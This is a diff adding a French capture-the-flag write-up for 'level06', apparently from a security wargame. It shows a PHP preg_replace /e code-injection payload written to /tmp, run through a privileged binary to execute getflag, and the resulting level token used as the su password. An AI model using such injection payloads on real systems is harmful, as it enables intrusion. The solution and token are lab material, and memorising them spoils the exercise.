@@ -1,0 +1,24 @@
+LEVEL 06
+--------
+
+1.  Commande:   ls
+    Sortie:     level06 level06.php
+    
+    En lancant level06 on peut voir que l'exécutable utilise
+    le programme .php
+
+2.  En analysant le programme php on remarque qu'il faut passer
+    en paramètre de l'exécutable un fichier.
+    On va exploiter la faille preg_replace qui se situe sur cette
+    ligne: $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+    Commande:   echo "[x {\${@system(getflag)}}]" > /tmp/test
+
+    On créé une nouvelle fois le fichier dans /tmp.
+
+3.  Ensuite on met le nouveau fichier en paramètre de l'exécutable.
+    Commande:   ./level06 /tmp/test
+    Sortie:     Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+
+4.  Commande:   su level07
+    Mdp:        wiok45aaoguiboiki2tuin6ub
